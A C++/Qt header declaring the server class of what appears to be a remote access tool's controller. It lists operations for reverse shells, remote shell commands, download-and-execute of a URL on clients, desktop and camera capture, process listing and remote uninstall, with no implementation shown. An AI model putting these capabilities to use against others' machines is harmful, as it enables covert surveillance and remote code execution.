#pragma once

#include "../errors/AppException.h"
#include "Reporter.h"

#include "shared/net/processors/QDataStreamPacketProcessor.h"
#include "concurrent/events/net/ClientNetEvent.h"
#include <QApplication>
#include <QTcpServer>
#include <QReadWriteLock>
#include <QThread>


class PacketChat;
class PacketShell;
class PacketMediaResponse;
class PacketDesktopConfigResponse;
class PacketDesktopResponse;
class NetClientService;
class RemoteClient;
class Packet;
class RemoteClient;
class PacketPresentation;
class PacketProcessResponse;
class PacketCameraConfigResponse;

typedef qint64 SocketDescriptor;

class NetServerService : public QObject, public QEnableSharedFromThis<NetServerService>
{
Q_OBJECT
public:

	NetServerService();
	~NetServerService();

	void startService();
	void stopServer();
	void onClientDisconnected(const QSharedPointer<NetClientService>& client);
	bool is_listening() const;


	void sendTestNetEvent();
	void set_reporter(const Reporter& reporter);


	void requestClientInfo(qint64 clientId);
	void requestClientProcessList(qint64 clientId);

	void requestStartDesktopSession(qint64 clientId, const QString& selectedDisplay);
	// void sendPacket(qint64 client_id, const Packet& packet);

	void sendPacket(qint64 clientId, const Packet& packet,
	                void (*beforeSendCallback)(const QSharedPointer<RemoteClient>& remoteClient, bool found));

	void requestPauseDesktopSession(qint64 clientId);
	void requestStopDesktopSession(qint64 clientId);

signals:
	void sendNetClientEventToApp(const ClientNetEvent& event);
	void clientDataReceivedPtr(QSharedPointer<ClientNetEvent> event);
	void sendNetEventToApp(const NetEvent& ev);
	void sendPingToApp();
	void sendNetClientEventToAppPtr(const QSharedPointer<ClientNetEvent>& event);

public slots:
	// Triggered by XeytanQpp Application
	void onRequestCloseClientConnection(qint64 clientId, bool sendClosePacket = true);

	// Triggered by NetClientService
	void onNewClientConnection();

	void recvPingFromApp();

	//void on_Socket_Ready_Read();
	void onPingAppTimer();
	void onClientPacketReceived(const Packet& packet);
	void onPresentationPacket(PacketPresentation& packet);

	void onDesktopPacketReceived(PacketDesktopResponse& packet);
	void requestCameraConfiguration(qint64 clientId);
	void onCameraConfigPacketReceived(const PacketCameraConfigResponse& packet);
	QSharedPointer<Client> getClientById(qint64 clientId);
	QSharedPointer<RemoteClient> getRemoteClient(qint64 clientId);
	void requestStartCameraSession(qint64 clientId, const QString& cameraDeviceName);
	void requestPauseCameraSession(qint64 clientId);
	void requestStopCameraSession(qint64 clientId);
	void onDesktopConfigPacketReceived(const PacketDesktopConfigResponse& packet);

	void onCameraPacketReceived(const PacketMediaResponse& packet);
	void requestStartReverseShell(qint64 clientId);

	void requestStartChat(qint64 clientId);
	void closeChat(qint64 clientId);
	void sendChatMessage(qint64 clientId, const QString& message);
	
	void requestAddShellCommand(qint64 clientId, const QString& command);
	void requestDownloadAndExecute(qint64 clientId, const QString& url);
	
	void requestStopReverseShell(qint64 clientId);
	void onProcessPacketReceived(const PacketProcessResponse& packet);
	void requestDesktopConfiguration(qint64 clientId);
	void onShellPacketReceived(const PacketShell& packet);
	void onChatPacketReceived(const PacketChat& packet);
	
	void requestUninstall(qint64 clientId);
private:
	QSharedPointer<NetClientService> getNetClientService(qint64 clientId);


	//void writeAuthAnswer(QTcpSocket* socket, bool answer);
	//void writeUserList(QTcpSocket* socket, const QList<UserData>& lst);
	//void sendOutMessage(QTcpSocket* sender, const Message& msg);
	//void writeAboutNewConnection(const UserData& connectedUser);
	//void writeAboutUserDisconnection(const UserData& disconnectedUser);
	//void connectSocketSignals(QTcpSocket* socket);

private:

	// QMap<QUuid, QSharedPointer<RemoteClient>> clients;

	QMap<SocketDescriptor, QSharedPointer<RemoteClient>> clients;
	QTcpServer* serverSocket;
	Reporter reporter;
	QReadWriteLock clientsMutex;
};
